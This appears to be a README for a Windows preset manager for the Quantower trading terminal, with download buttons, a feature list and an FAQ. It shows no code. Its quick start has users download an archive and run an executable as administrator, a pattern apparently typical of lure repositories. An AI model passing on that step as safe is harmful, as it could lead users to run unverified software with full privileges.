# Quantower Preset Manager

![Windows](https://img.shields.io/badge/Platform-Windows%2010%2F11-0078D6?style=flat-square&logo=windows&logoColor=white)
![Version](https://img.shields.io/badge/Version-1.0.0-brightgreen?style=flat-square)
![Downloads](https://img.shields.io/badge/Downloads-New-blue?style=flat-square)
![License](https://img.shields.io/badge/License-MIT-blue?style=flat-square)

Desktop preset manager for Quantower — save, switch, and back up workspace layouts, chart templates, and panel configurations across multiple monitors and markets.

<div align="center">

[![Download for Windows](https://img.shields.io/badge/%E2%AC%87%EF%B8%8F%20Download%20v1.0.0-2EA043?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/BankerTrough/quantower-preset-manager-2026/releases/tag/1.0.0)

</div>

---

## ⚡ At a Glance

| | |
|---|---|
| **What it is** | Preset manager for Quantower |
| **Who it's for** | Quantower users who run multiple monitors and strategies |
| **What it solves** | Manual workspace switching, no backup, no config diff |
| **How it works** | Reads local config files, manages presets via GUI |

---

## 🔥 Why This Exists

Quantower is a multi-market terminal — futures, forex, crypto, stocks, options. Traders who use it seriously run multiple monitors and multiple strategies. A scalping layout on ES futures looks nothing like a swing layout on crypto pairs.

Quantower saves workspaces, but switching is manual. Backing up layouts before an update is a file-copy exercise. And there's no way to see what changed between two presets.

This manager fixes that. It reads the local config directory, gives you a GUI to save and switch presets, and exports everything to a single archive.

---

## 🧩 What It Does

### Preset Manager
- Save any workspace as a named preset
- Switch between presets with one click
- Rename, delete, and duplicate presets
- Presets store: panel positions, monitor assignment, window sizes

### Backup & Restore
- Export all presets to a single `.zip` archive
- Restore after reinstall or a broken update
- Version history for each preset (keeps last 5 versions)

### Multi-Monitor Support
- Presets store per-monitor panel assignment
- Switching from 2 monitors to 4 keeps the layout intact
- Monitor layout preview before applying a preset

### Config Diff
- Compare two presets side by side
- See exactly what changed: indicator settings, panel positions, order ticket defaults
- Export diff as JSON for version control

---

## 💻 System Requirements

| Component | Minimum | Recommended |
| :--- | :--- | :--- |
| **OS** | Windows 10 (64-bit) | Windows 11 |
| **RAM** | 4 GB | 8 GB |
| **Storage** | 100 MB | 200 MB |
| **Runtime** | .NET 8.0 (bundled) | .NET 8.0 |
| **Terminal** | Quantower installed | Latest version |
| **Permissions** | Administrator | Administrator |

---

## 🚀 Quick Start

1. **Download** the archive using the button above
2. **Extract** with 7-Zip or WinRAR
3. **Run** `QTPresetManager.exe` as administrator
4. **Select** your Quantower config folder (auto-detected)
5. **Save** your current workspace as a preset
6. **Switch** between presets with one click

---

## ❓ FAQ

**Does this modify Quantower files?**
It reads config files and creates preset archives. It does not modify Quantower's installation. When you apply a preset, it copies the preset's config into Quantower's folder — same as manually copying files.

**Will I get banned by brokers or exchanges?**
No — this is a local config manager. It does not interact with trading APIs, execute trades, or connect to any exchange.

**Does it work with all Quantower versions?**
Yes — it reads the standard config directory. If Quantower changes the config format in a future update, the manager will be updated.

**Can I share presets with other traders?**
Yes — export a preset as a `.qtpreset` file and share it. The recipient imports it.

**Does it back up my API keys?**
It backs up config files, which may include API key placeholders. Actual keys are stored by Quantower in an encrypted format and are not exported in plain text.

**How do I uninstall?**
Delete the manager folder. Presets remain in their archive folder.

---

## 🗺️ Roadmap

- [ ] Cloud backup for presets
- [ ] Preset sharing via URL
- [ ] Auto-switch presets based on time of day or market session
- [ ] Multi-language support

---

## 📄 License

MIT License — see [LICENSE](LICENSE) for details.

**Note:** This manager is not affiliated with Quantower. Quantower is a trademark of its respective owner.

---

<div align="center">

[![Download for Windows](https://img.shields.io/badge/%E2%AC%87%EF%B8%8F%20Download%20v1.0.0-2EA043?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/BankerTrough/quantower-preset-manager-2026/releases/tag/1.0.0)

**Version 1.0.0** — Preset Edition · Workspace Manager · MIT

</div>
